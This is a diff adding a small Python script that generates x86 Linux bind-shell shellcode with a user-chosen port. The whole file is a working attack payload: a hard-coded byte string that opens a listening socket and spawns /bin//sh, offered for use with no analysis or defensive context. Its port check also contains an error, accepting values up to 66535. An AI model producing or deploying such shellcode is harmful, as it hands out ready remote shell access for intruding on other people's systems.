@@ -1,0 +1,20 @@
+#!/usr/bin/python3
+import argparse
+
+parser = argparse.ArgumentParser(description='Quickly set the port for a x86 linux bind shellcode\n')
+parser.add_argument('port', metavar='p', type=int, nargs=1,
+                    help='port number')
+
+args =parser.parse_args()
+port =args.port[0]
+
+#error checking
+if (port > 66535 or port < 0):
+    print("[LOG]: insert a valid port number!")
+    exit(1)
+
+#convert int to hex and format it 
+port = '{0:0{1}X}'.format(port,4)
+port = '\\x' + '\\x'.join(port[i:i+2] for  i in range(0, len(port), 2))
+shellcode =r'"\x31\xc0\x31\xdb\x31\xd2\x53\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x8d\x0c\x24\xcd\x80\x89\xc6\x52\x66\x68' + port  + r'\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x52\x56\x89\xdf\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x52\x52\x56\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x87\xcf\x41\xb0\x3f\x49\xb0\x3f\xcd\x80\x75\xf9\x52\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";'
+print(shellcode)
